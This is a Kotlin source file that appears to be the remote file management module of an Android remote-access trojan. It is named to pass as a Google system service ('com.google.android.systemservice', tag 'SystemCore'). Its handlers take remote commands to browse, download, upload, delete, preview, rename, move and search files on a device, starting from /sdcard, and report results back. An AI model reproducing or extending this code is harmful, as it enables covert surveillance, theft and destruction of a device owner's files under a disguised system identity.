package com.google.android.systemservice.handlers

import android.content.Intent
import com.google.android.systemservice.services.FileBrowserService
import org.json.JSONObject

class FileHandlers(private val ctx: CommandContext) {
    companion object {
        private const val TAG = "SystemCore"
    }

    fun executeBrowseFiles(params: JSONObject?) {
        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "list_files")
            putExtra("params", JSONObject().apply {
                put("path", path)
                put("recursive", params?.optBoolean("recursive", false) ?: false)
            }.toString())
        }
        ctx.appContext.startService(intent)
        ctx.sendResponse("file_browser", JSONObject().apply {
            put("status", "listing")
            put("path", path)
        })
    }

    fun executeListFiles(params: JSONObject?) {
        val path = params?.optString("path", "/sdcard") ?: "/sdcard"
        val recursive = params?.optBoolean("recursive", false) ?: false
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "list_files")
            putExtra("params", JSONObject().apply {
                put("path", path)
                put("recursive", recursive)
            }.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executeDownloadFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "download_file")
            putExtra("params", JSONObject().apply {
                put("path", path)
            }.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executeUploadFile(params: JSONObject?) {
        params ?: return
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "upload_file")
            putExtra("params", params.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executeUploadFileChunk(params: JSONObject?) {
        params ?: return
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "upload_file_chunk")
            putExtra("params", params.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executeDeleteFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "delete_file")
            putExtra("params", JSONObject().apply {
                put("path", path)
            }.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executePreviewFile(params: JSONObject?) {
        val path = params?.optString("path") ?: return
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "preview_file")
            putExtra("params", JSONObject().apply {
                put("path", path)
                put("max_size", params?.optLong("max_size", 1024 * 1024) ?: (1024 * 1024))
            }.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executeRenameFile(params: JSONObject?) {
        params ?: return
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "rename_file")
            putExtra("params", params.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executeMoveFile(params: JSONObject?) {
        params ?: return
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "move_file")
            putExtra("params", params.toString())
        }
        ctx.appContext.startService(intent)
    }

    fun executeSearchFiles(params: JSONObject?) {
        params ?: return
        val intent = Intent(ctx.appContext, FileBrowserService::class.java).apply {
            putExtra("request_id", ctx.getCurrentRequestId())
            putExtra("command", "search_files")
            putExtra("params", params.toString())
        }
        ctx.appContext.startService(intent)
    }
}
